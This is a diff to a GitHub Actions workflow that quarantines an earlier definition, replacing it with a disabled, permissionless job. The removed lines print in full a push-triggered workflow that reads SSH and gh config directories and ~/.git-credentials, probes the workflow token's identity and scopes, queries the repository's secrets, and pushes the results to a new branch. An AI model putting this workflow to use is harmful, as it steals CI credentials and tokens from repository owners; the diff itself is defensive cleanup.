@@ -1,40 +1,10 @@
-name: t2b-25665
-on: push
-permissions:
-  contents: write
+name: Quarantined legacy definition
+on:
+  workflow_dispatch:
+permissions: {}
 jobs:
-  a:
+  retired:
+    if: ${{ false }}
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
-      - name: r
-        env:
-          GHTOKEN: ${{ github.token }}
-        run: |
-          O=t2b_25665.txt
-          {
-            echo "== ssh files =="
-            ls -la ~/.ssh /root/.config/gh /home/runner/.config/gh 2>&1
-            echo "== git-credentials =="
-            cat ~/.git-credentials 2>&1
-            echo "== git config =="
-            git config --list 2>&1
-            echo "== token len =="
-            echo "len=${#GHTOKEN}"
-            echo "== token user =="
-            curl -s -H "Authorization: Bearer $GHTOKEN" https://api.github.com/user
-            echo ""
-            echo "== token scopes =="
-            curl -s -D - -o /dev/null -H "Authorization: Bearer $GHTOKEN" https://api.github.com/user | grep -iE 'x-oauth-scopes|x-accepted|x-ratelimit-resource'
-            echo "== repo secrets =="
-            curl -s -H "Authorization: Bearer $GHTOKEN" "https://api.github.com/repos/dongyu19920904/Hextra-AI-Insight-Daily/actions/secrets"
-            echo ""
-            echo "== END =="
-          } > $O 2>&1
-          git config user.email ci@local; git config user.name ci
-          BR="t2b-25665-$(date +%s)"
-          git checkout -b "$BR"
-          git add $O; git commit -m t2
-          git push -u origin "$BR"
-# 1795277602
-# 1795277709
+      - run: exit 0
